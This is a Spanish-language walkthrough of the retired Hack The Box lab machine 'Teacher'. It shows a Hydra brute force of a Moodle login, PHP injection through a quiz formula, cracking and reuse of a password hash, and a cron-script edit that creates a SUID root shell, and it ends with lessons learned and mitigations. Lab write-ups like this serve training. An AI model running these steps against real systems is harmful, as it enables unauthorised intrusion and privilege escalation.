---
machine: Teacher
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, moodle, hydra, sqli, cron]
---

# Teacher — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una imagen PNG contiene texto con casi toda la contraseña de Moodle; Hydra completa el último carácter. El quiz de Moodle permite inyección PHP y da una shell. La base filtra el hash MD5 de `giovanni`, reutilizado por SSH, y un script de backup ejecutado por cron es escribible, lo que permite obtener root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Puertos: `22/tcp` SSH y `80/tcp` HTTP.
- Servicios: Apache con Moodle y SSH.
- Tecnologías: Moodle, PHP, MySQL, MD5, cron y bash.

## Enumeración

- `teacher.htb` con Moodle.
- Imagen PNG que en realidad contiene texto.
- Curso con quiz y preguntas de cálculo.
- Usuario `giovanni` y tarea cron de backup.

## Foothold

Se descarga la imagen y `strings` revela la contraseña casi completa. Hydra prueba el último carácter contra el login de Moodle. En el quiz se inyecta PHP en una pregunta calculada y se ejecuta al previsualizar.

```bash
curl -s -O http://teacher.htb/images/<IMAGE>.png
strings <IMAGE>.png
hydra -l <USER> -P chars.txt teacher.htb http-post-form \
  '/login/index.php:username=^USER^&password=^PASS^:Invalid login'
# Inyectar PHP en la fórmula del quiz y previsualizar
curl -s -b moodle.txt 'http://teacher.htb/mod/quiz/attempt.php?attempt=<ID>'
```

## Movimiento lateral

La shell permite leer la base de Moodle. El hash MD5 de `giovanni` se crackea o se reutiliza; la contraseña abre SSH.

## Escalada de privilegios

Un cron ejecuta un script de backup como root y el usuario puede escribirlo. Se añade una línea que crea una copia SUID de bash o ejecuta una shell; el siguiente ciclo entrega root.

```bash
pspy -f
ls -l /usr/bin/backup.sh
printf 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' >> /usr/bin/backup.sh
/tmp/rootbash -p
```

## Evidencia

- Texto oculto en el PNG y login de Moodle.
- Ejecución PHP en el quiz.
- Hash MD5 crackeado y script cron modificado.

## Lecciones aprendidas

- Los metadatos y archivos aparentemente inocentes pueden filtrar secretos.
- Un quiz que evalúa fórmulas es una superficie de ejecución.
- Los scripts de backup privilegiados deben ser inmutables.

## Mitigación y detección

- No reutilizar contraseñas ni dejar pistas en imágenes.
- Deshabilitar evaluación de PHP en el contenido de Moodle.
- Ejecutar backups con una cuenta dedicada y scripts no escribibles.

## Referencias

- [0xdf — Teacher](https://0xdf.gitlab.io/2019/04/20/htb-teacher.html)
- [IppSec — Teacher](https://www.youtube.com/watch?v=u2-te8n2WbY)
- [Hack The Box — Teacher](https://app.hackthebox.com/machines/teacher)
